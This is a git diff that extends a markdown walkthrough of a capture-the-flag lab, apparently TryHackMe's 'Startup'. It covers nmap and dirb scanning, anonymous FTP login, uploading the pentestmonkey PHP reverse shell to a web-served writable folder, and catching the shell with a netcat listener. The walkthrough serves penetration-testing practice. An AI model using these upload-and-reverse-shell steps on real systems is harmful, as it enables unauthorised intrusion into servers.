@@ -26,6 +26,10 @@ PORT   STATE SERVICE
 80/tcp open  http
 |_http-title: Maintenance
 ```
+We get that port 21, 22 and port 80 are open.
+Because we used -sC we also get some extra info about FTP.
+We can login as Anonumous and the ftp folder is writable.
+We also get FTP and SSH server versions.
 *************
 ### Dirbuster
 
@@ -35,13 +39,32 @@ dirb http://10.10.96.196 -w /usr/share/wordlists/dirb/common.txt
 http://10.10.96.196/index.html
 http://10.10.96.196/files/ftp/ 
 ```
+Dirbuster shows that we can access the FTP folder from HTTP, **thats interesting** .
 *******
 ### HTTP
-![image](https://user-images.githubusercontent.com/93491173/216457959-4ac23f3e-f451-4385-82ff-23bda5fc37e2.png)
-```
-
-```
+The main web page is just a http file with nothing interesting.<br>
+**But if we try the /files folder we get this!**<br>
+![image](https://user-images.githubusercontent.com/93491173/216457959-4ac23f3e-f451-4385-82ff-23bda5fc37e2.png)<br>
+The /ftp folder is empty.
 *******
 ### FTP
-Since FTP directory is writable 
+The ftp folder writable, lets see what we can do with that.
+We can start to upload pentestmonkey.php reverse shell.
 ```
+ftp Anonymous@IPADRESS
+no passwd
+
+cd ftp
+ftp> put
+(local-file) /home/kali/THM/Startup/Files/pentestmonkey.php
+(remote-file) pentestmonkey.php
+local: /home/kali/THM/Startup/Files/pentestmonkey.php remote: pentestmonkey.php
+```
+That worked fine, and its shows up in the browser.
+*********
+### Reverse shell
+Lets try to get a revers shell running.
+```
+(local host) nc -nlvp 4444
+```
+Open the pentestmonkey.php in the web browser, we are connected!
